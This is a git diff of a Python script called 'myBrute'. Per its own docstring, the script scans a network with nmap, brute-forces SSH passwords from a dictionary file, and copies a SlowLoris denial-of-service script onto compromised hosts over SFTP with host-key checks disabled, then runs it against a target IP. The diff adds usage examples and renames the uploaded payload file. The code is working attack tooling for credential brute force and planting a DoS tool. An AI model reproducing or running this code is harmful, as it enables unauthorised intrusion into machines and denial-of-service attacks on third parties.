@@ -6,8 +6,13 @@ Once host is selected, brute force attack will be done to get access of the othe
 Then the script shall transfer SlowL.py file 
 Then execute the file with target IP address
 
+
+Usage:   python myBrute <IP network> <dictionary file>
+Example: python myBrute 192.168.122.0/24 dict.txt
+
 '''
 
+#! /usr/bin/python
 
 import nmap
 from pexpect import pxssh
@@ -46,7 +51,7 @@ def nmap_scan(network):
 # SSH and connect to the desired host
 
 def connect(host, user, password):
-    fails =0
+    fails = 0
 
     try:
         s = pxssh.pxssh()
@@ -84,17 +89,19 @@ def send_file(host, user, password):
     print("Sending file on Host: %s Username: %s Password: %s" %(host,user,password))
 
     try:
-        cnopts = sftp.CnOpts()
-        cnopts.hostkeys = None
-        #usr = str(user)
+        cnopts = sftp.CnOpts()   # CnOpts stands for Connection Options 
+        cnopts.hostkeys = None 
         s = sftp.Connection(host=host, username='sopya', password=password, cnopts=cnopts)
 
-        print("Connection done... sending file!!")      
+        print("Connection done...!!")      
  
-        remotepath= '/home/sopya/Brute.py'
-        localpath= os.getcwd()+'/'+'myBrute.py'
+        remotepath= '/home/sopya/SlowLorris.py'
+        localpath= os.getcwd()+'/'+'slowL.py'
 
         s.put(localpath, remotepath)
+
+        print("File sent successfully..!!")
+        
         s.close()
 
     except Exception, e:
